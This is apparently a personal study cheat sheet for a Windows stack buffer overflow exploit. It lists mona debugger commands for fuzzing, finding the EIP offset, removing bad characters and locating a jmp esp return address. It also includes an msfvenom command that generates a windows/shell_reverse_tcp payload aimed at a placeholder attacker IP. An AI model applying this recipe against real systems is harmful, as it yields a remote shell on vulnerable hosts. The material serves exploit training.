Windows
==========
Set your working mona folder
- ```!mona config -set workingfolder c:\mona\%p```

1. Fuzz how many bytes it takes to crash the program.
2. Add 400 bytes to how much it took to make it crash.
3. Find the offset to find overwrite the EIP or target address. Look for what has a cyclic pattern in it.
  - Using Mona: ```!mona findmsp -distance <How long the pattern is>```
4. Find any badchars that would get in the way of any shellcode. Keep in mind that the surrounding bytes could be corrupted.
  - ```!mona bytearray -b "\x00"``` to generate a bytearray for which to base your array off
  - ```!mona compare -f [dir] -a [address of esp]``` to find the badchars. Remove any badchars from your own array. Repeat ```!mona bytearray -b "\x00..."``` until no more badchars.
5. Find a jump point (return address)
  - ```!mona jmp -r esp -cpb "\x00..."``` Finds all ```jmp esp``` instructions that don't have any badchars. This will be your return address. Take note of the endianess of the system.
6. Generate payload with MSFvenom
  - ```msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c```. The -b will have your bad chars
7. Add NOP sled
  - Add around 16 bytes of "\x90"
